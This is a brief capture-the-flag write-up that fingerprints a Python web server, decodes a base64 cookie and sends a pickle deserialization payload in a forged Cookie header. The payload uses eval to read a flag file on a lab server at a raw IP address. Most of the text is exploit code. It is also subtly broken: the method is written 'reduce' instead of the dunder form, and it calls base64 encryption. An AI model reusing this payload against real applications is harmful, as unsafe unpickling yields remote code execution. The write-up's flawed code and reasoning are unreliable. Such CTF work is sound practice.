let's check on what server this website runs
curl -I [url]
now we know that it runs on python and we got our set-cookie
let's try to decode this cookie
echo -n '...' | base64 -d
now we know that cookies are ecnrypted in base64, we got python server -> pickle server
let's write a python code to get our CTF
import pickle 
import base64
import requests
class Exploit (object):
        def reduce (self):
                return eval, ("open('flag', 'r').read()", )
def sendPayload(p):
        print (base64.urlsafe_b64encode(p))
        headers ={"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
        t = requests.get("http://34.141.39.165:31924/dashboard", headers=headers) 
        print(t.text)
sendPayload(pickle.dumps(Exploit(), protocol=2))
and here is our CTF
